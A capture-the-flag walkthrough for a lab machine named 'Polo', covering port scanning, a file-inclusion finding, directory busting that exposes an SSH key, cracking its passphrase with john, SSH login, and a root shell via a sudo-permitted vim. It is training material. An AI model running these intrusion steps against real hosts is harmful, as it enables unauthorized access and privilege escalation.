# **Polo - ThunderCipher**

*Target Ip. Address: 192.168.5.116*

So, let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 192.168.5.116                                                                                                                          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 15:37 +0545
Nmap scan report for 192.168.5.116 (192.168.5.116)
Host is up (0.071s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 e9:db:b4:b3:6b:4f:24:b6:18:23:85:2d:65:92:7f:b2 (ECDSA)
|_  256 15:36:38:eb:3c:37:8e:c6:6f:09:26:c4:d1:0e:3a:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Polo
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.09 seconds\
```

So, we have 2 open ports. Port 22 (ssh) and port 80 (http). Going to website at port 80.

<img width="1195" height="661" alt="image" src="https://github.com/user-attachments/assets/aa769afc-2aba-4936-aabd-972b214021d2" />

So, we have a classic apache website, but the ?page=... encourages me to try for LFI. Let's try some basic payloads.

<img width="1243" height="670" alt="image" src="https://github.com/user-attachments/assets/375c6881-bbe5-4afb-a2a0-973c50a6f849" />

We have successful LFI, I tried to recover if there were some hidden ssh-keys, passwords, etc. but nothing. I even tried php_filter_proxychains.

So, coming back let's do some directory busting.

```bash
kali@kali:gobuster dir -u http://192.168.5.116 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.116
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
development          (Status: 301) [Size: 320] [--> http://192.168.5.116/development/]
server-status        (Status: 403) [Size: 278]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

We get development and in that we have ssh-key. Should have done that faster !!!

Since, the key is passphrase protected, brute force it using john.

```bash
kali@kali:ssh2john id_rsa > hash.txt

kali@kali:john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                                                 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
p...3          (id_rsa)     
1g 0:00:13:02 DONE (2026-02-09 15:56) 0.001277g/s 27.27p/s 27.27c/s 27.27C/s polo123..mamipapi
Use the "--show" option to display all of the cracked passwords reliably
```

Now, we have everything, we need. Let's login via ssh.

```bash
kali@kali:ssh polo@192.168.5.116 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux manbahadurthapa46467105 6.17.4-2-pve #1 SMP PREEMPT_DYNAMIC PMX 6.17.4-2 (2025-12-19T07:49Z) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov  8 17:43:12 2024 from 192.168.1.2
polo@manbahadurthapa46467105:~$ 
```

We are in. Let's read first flag at the home directory.

```bash
polo@manbahadurthapa46467105:~$ cat user.txt
ThunderCipher{P0.....nd!!!}
```

Let's check if we have any sudo permissions.

```bash
polo@manbahadurthapa46467105:~$ sudo -l
Matching Defaults entries for polo on manbahadurthapa46467105:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User polo may run the following commands on manbahadurthapa46467105:
    (ALL) NOPASSWD: /usr/bin/vim
```

Great, We can use /usr/bin/vim as root. Let's become root.

```bash
polo@manbahadurthapa46467105:~$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root. Let's wrap up this challenge by reading final flag at root directory.

```bash
# cat root.txt
ThunderCipher{Su.....3r}
```
